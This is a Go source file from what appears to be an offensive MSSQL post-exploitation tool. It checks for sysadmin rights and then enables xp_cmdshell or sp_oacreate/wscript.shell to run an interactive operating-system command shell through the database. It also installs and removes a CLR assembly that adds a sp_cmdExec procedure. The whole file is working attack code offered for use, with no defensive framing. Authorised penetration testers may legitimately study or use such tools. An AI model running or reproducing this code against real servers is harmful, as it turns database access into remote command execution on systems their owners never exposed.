package plugin

import (
	"SQLPrivilege/data"
	"fmt"
)

func Mssql_xp_cmdshell(mssqlobj *data.MSSQLOBJ){
	conn ,err := ConnDB(mssqlobj)
	if err != nil {
		fmt.Println("[-] connect mssql database failed ")
		return
	}
	// 判断执行是否为sysadmin权限
	query, err := SQLQuery(`select '1'=(select is_srvrolemember('sysadmin'))`,conn)
	if err != nil {
		fmt.Println("[-] may be connect mssql database is failed")
		return
	}

	var result string
	err = query.QueryRow().Scan(&result)
	if err != nil {
		fmt.Println("[-] Judgement mssql user privilege is failed")
		return
	}
	// 如果为1，则是sysadmin权限，可执行命令
	if result == "1"{
		for _,xpQuery := range data.XP_CMDSHELL{

			query,err = conn.Prepare(xpQuery)
			if err != nil {
				return
			}
			_, err = query.Query()
			if err != nil {
				fmt.Println("[-] Open xp_cmdshell is failed")
				return
			}
		}
		fmt.Println("[+] Open xp_cmdshell is success")

		// 成功开启，则开始for循环接受用户输入
		for{
			cmd := CMD_SHELL()
			if cmd == "exit"{
				return
			}
			// 执行系统命令获取输出结果
			query , err = conn.Prepare(fmt.Sprintf(`EXEC master ..xp_cmdshell '%s'`,cmd))
			row, err := query.Query()
			if err !=nil {
				return
			}
			for row.Next(){
				var result string
				row.Scan(&result)
				fmt.Println(result)
			}
			defer row.Close()
		}
	}else{
		fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		return
	}
}







func Mssql_sp_oacreate(mssqlobj *data.MSSQLOBJ){
	conn ,err := ConnDB(mssqlobj)
	if err != nil {
		fmt.Println("[-] connect mssql database failed ")
		return
	}
	// 判断执行是否为sysadmin权限
	query, err := SQLQuery(`select '1'=(select is_srvrolemember('sysadmin'))`,conn)
	if err != nil {
		fmt.Println("[-] may be connect mssql database is failed")
		return
	}

	var result string
	err = query.QueryRow().Scan(&result)
	if err != nil {
		fmt.Println("[-] Judgement mssql user privilege is failed")
		return
	}
	// 如果是1，则是sysadmin权限，可以尝试打开sp_oacreate组件
	if result == "1"{
		for _,spQuery := range data.SP_OACREATE{
			query,err = conn.Prepare(spQuery)
			if err != nil {
				return
			}
			_, err = query.Query()
			if err != nil {
				fmt.Println("[-] Open sp_oacreate is failed")
				fmt.Println(err)
				return
			}

		}
		fmt.Println("[+] Open sp_oacreate is success")

		for {
			cmd := CMD_SHELL()
			if cmd == "exit"{
				return
			}
			query, err := conn.Query(fmt.Sprintf(`declare @shell int,@exec int,@text int,@str varchar(8000);exec sp_oacreate 'wscript.shell',@shell output; exec sp_oamethod @shell,'exec',@exec output,'c:\windows\system32\cmd.exe /c %v';exec sp_oamethod @exec, 'StdOut', @text out;exec sp_oamethod @text, 'ReadAll', @str out;select @str`,cmd))
			if err != nil {
				fmt.Println(err)
				return
			}
			query.Next()
			var result string
			err = query.Scan(&result)
			if err != nil {
				fmt.Println(err)
			}

			fmt.Println(result)
		}
	}else{
		fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		return
	}
}

func OpenCLR(mssqlobj *data.MSSQLOBJ){
	conn ,err := ConnDB(mssqlobj)
	if err != nil {
		fmt.Println("[-] connect mssql database failed ")
		return
	}
	// 判断执行是否为sysadmin权限
	query, err := SQLQuery(`select '1'=(select is_srvrolemember('sysadmin'))`,conn)
	if err != nil {
		fmt.Println("[-] may be connect mssql database is failed")
		return
	}

	var result string
	err = query.QueryRow().Scan(&result)
	if err != nil {
		fmt.Println("[-] Judgement mssql user privilege is failed")
		return
	}
	if result == "1"{
		for _,CLRQuery := range data.CLR_CREATE{
			query,err = conn.Prepare(CLRQuery)
			if err != nil {
				return
			}
			_, err = query.Query()
			if err != nil {
				fmt.Println("[-] Try to Open CLR is failed")
				fmt.Println(err)
				return
		}
	}
		fmt.Println("[+] install CLR is success")
		fmt.Println("[+] You Can exec <EXEC sp_cmdExec 'whoami'> in SQL Manager to Test it")
	}else{
		fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		return
	}
}
func CloseCLR(mssqlobj *data.MSSQLOBJ){
	conn ,err := ConnDB(mssqlobj)
	if err != nil {
		fmt.Println("[-] connect mssql database failed ")
		return
	}
	// 判断执行是否为sysadmin权限
	query, err := SQLQuery(`select '1'=(select is_srvrolemember('sysadmin'))`,conn)
	if err != nil {
		fmt.Println("[-] may be connect mssql database is failed")
		return
	}

	var result string
	err = query.QueryRow().Scan(&result)
	if err != nil {
		fmt.Println("[-] Judgement mssql user privilege is failed")
		return
	}
	if result == "1"{
		query,err = conn.Prepare(`DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit]`)
		if err != nil {
			return
		}
		_, err = query.Query()
		if err != nil {
			fmt.Println("[-] Try to Close CLR is failed")
			fmt.Println("[-] may be not exist CLR execute extend")
			return
		}
		fmt.Println("[+] uninstall CLR extend is success")
	}else {
		fmt.Println("[-] Judgement mssql user is not sysadmin privilege")
		return
	}

}